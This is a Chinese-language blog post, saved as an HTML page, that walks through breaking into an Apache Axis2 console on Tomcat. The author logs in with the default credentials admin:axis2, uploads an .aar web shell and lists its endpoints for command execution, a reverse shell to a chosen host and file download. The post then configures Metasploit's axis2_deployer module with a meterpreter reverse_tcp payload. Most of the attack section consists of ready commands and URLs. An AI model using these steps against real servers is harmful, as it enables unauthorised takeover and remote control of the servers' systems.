@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Axis2弱口令渗透测试 - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="Axis2弱口令渗透测试">
+<meta itemprop="description" content="故事背景 发现一个Tomcat服务器 使用dirsearch 扫描查看存在的目录 dirsearch -u xxx -e *
+发现存在/axis2/axis2-admin/路径 访问http://10.xxx.xxx.158:18089/axis2/axis2-admin/
+漏洞发现 访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功 漏洞利用 找到上传点，axis2可上传.aar格式木马 访问 http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService 找到木马访问路径
+木马下载地址 https://github.com/Svti/Axis2Shell axis2 web shell使用介绍：
+1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好) 2、反弹shell http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell) 文件上传 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名) 文件下载 http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名) 5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传) 构造木马访问连接 http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd
+漏洞利用（msf方法） 该漏洞也可以使用msf利用模块 exploit/multi/http/axis2_deployer 查看配置show options
+set RHOST xxxxxxxx set RPORT xxxx 然后设置payload set payload java/meterpreter/reverse_tcp 设置监听服务器地址 set LHOST xxxxx 设置监听端口 set LPORT xxxxx
+执行exploit命令，反弹成功">
+<meta itemprop="datePublished" content="2019-11-04T19:34:07&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-04T19:34:07&#43;08:00" />
+<meta itemprop="wordCount" content="65">
+
+
+
+<meta itemprop="keywords" content="漏洞复现," /><meta property="og:title" content="Axis2弱口令渗透测试" />
+<meta property="og:description" content="故事背景 发现一个Tomcat服务器 使用dirsearch 扫描查看存在的目录 dirsearch -u xxx -e *
+发现存在/axis2/axis2-admin/路径 访问http://10.xxx.xxx.158:18089/axis2/axis2-admin/
+漏洞发现 访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功 漏洞利用 找到上传点，axis2可上传.aar格式木马 访问 http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService 找到木马访问路径
+木马下载地址 https://github.com/Svti/Axis2Shell axis2 web shell使用介绍：
+1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好) 2、反弹shell http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell) 文件上传 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名) 文件下载 http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名) 5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传) 构造木马访问连接 http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd
+漏洞利用（msf方法） 该漏洞也可以使用msf利用模块 exploit/multi/http/axis2_deployer 查看配置show options
+set RHOST xxxxxxxx set RPORT xxxx 然后设置payload set payload java/meterpreter/reverse_tcp 设置监听服务器地址 set LHOST xxxxx 设置监听端口 set LPORT xxxxx
+执行exploit命令，反弹成功" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/axis2%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" />
+<meta property="article:published_time" content="2019-11-04T19:34:07+08:00" />
+<meta property="article:modified_time" content="2019-11-04T19:34:07+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Axis2弱口令渗透测试"/>
+<meta name="twitter:description" content="故事背景 发现一个Tomcat服务器 使用dirsearch 扫描查看存在的目录 dirsearch -u xxx -e *
+发现存在/axis2/axis2-admin/路径 访问http://10.xxx.xxx.158:18089/axis2/axis2-admin/
+漏洞发现 访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功 漏洞利用 找到上传点，axis2可上传.aar格式木马 访问 http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService 找到木马访问路径
+木马下载地址 https://github.com/Svti/Axis2Shell axis2 web shell使用介绍：
+1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好) 2、反弹shell http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell) 文件上传 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名) 文件下载 http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名) 5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传) 构造木马访问连接 http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd
+漏洞利用（msf方法） 该漏洞也可以使用msf利用模块 exploit/multi/http/axis2_deployer 查看配置show options
+set RHOST xxxxxxxx set RPORT xxxx 然后设置payload set payload java/meterpreter/reverse_tcp 设置监听服务器地址 set LHOST xxxxx 设置监听端口 set LPORT xxxxx
+执行exploit命令，反弹成功"/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">04</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">Axis2弱口令渗透测试</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="故事背景">故事背景</h3>
+<p>发现一个Tomcat服务器
+使用dirsearch 扫描查看存在的目录
+<code>dirsearch -u xxx -e *</code></p>
+<p><img src="/images/2019/axis2/88c998dca6868c01d701240c4455454b.jpg" alt="88c998dca6868c01d701240c4455454b.jpg"></p>
+<p>发现存在/axis2/axis2-admin/路径
+访问<code>http://10.xxx.xxx.158:18089/axis2/axis2-admin/</code></p>
+<p><img src="/images/2019/axis2/e7a298b539954e9bb4a2c108836e33b8.png" alt="e7a298b539954e9bb4a2c108836e33b8.png"></p>
+<h3 id="漏洞发现">漏洞发现</h3>
+<p>访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功
+<img src="/images/2019/axis2/b390ea51d6f3cacf82aa3cb8a576ce48.png" alt="b390ea51d6f3cacf82aa3cb8a576ce48.png"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>找到上传点，axis2可上传.aar格式木马
+<img src="/images/2019/axis2/3527cccdaa322b9769926ab37b1250b6.png" alt="3527cccdaa322b9769926ab37b1250b6.png"></p>
+<p>访问 <code>http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService</code>
+找到木马访问路径</p>
+<p><img src="/images/2019/axis2/1f4f1285b3d85e78803c42f5607ec9f0.png" alt="1f4f1285b3d85e78803c42f5607ec9f0.png"></p>
+<p>木马下载地址
+<code>https://github.com/Svti/Axis2Shell</code>
+axis2 web shell使用介绍：</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好)
+2、反弹shell 
+http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell)
+文件上传 
+http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名)
+文件下载 
+http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名)
+5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传)
+</code></pre></div><p>构造木马访问连接
+<code>http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd</code></p>
+<p><img src="/images/2019/axis2/3e3be13526f6a6f38b1d7b097774cee0.png" alt="3e3be13526f6a6f38b1d7b097774cee0.png"></p>
+<h3 id="漏洞利用msf方法">漏洞利用（msf方法）</h3>
+<p>该漏洞也可以使用msf利用模块
+<code>exploit/multi/http/axis2_deployer</code>
+查看配置<code>show options</code></p>
+<p><img src="/images/2019/axis2/af20429cd75a5d60f99f1ce1d6bdb0dd.png" alt="af20429cd75a5d60f99f1ce1d6bdb0dd.png"></p>
+<p><code>set RHOST xxxxxxxx</code>
+<code>set RPORT xxxx</code>
+然后设置payload
+<code>set payload java/meterpreter/reverse_tcp</code>
+设置监听服务器地址
+<code>set LHOST xxxxx</code>
+设置监听端口
+<code>set LPORT xxxxx</code></p>
+<p><img src="/images/2019/axis2/069ef20a82e69a7ecab83d7c53fa42d6.png" alt="069ef20a82e69a7ecab83d7c53fa42d6.png"></p>
+<p>执行<code>exploit</code>命令，反弹成功</p>
+<p><img src="/images/2019/axis2/5c65600c39e7c955d1418ed2f66f7d1a.png" alt="5c65600c39e7c955d1418ed2f66f7d1a.png"></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+							
+						</ul>
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
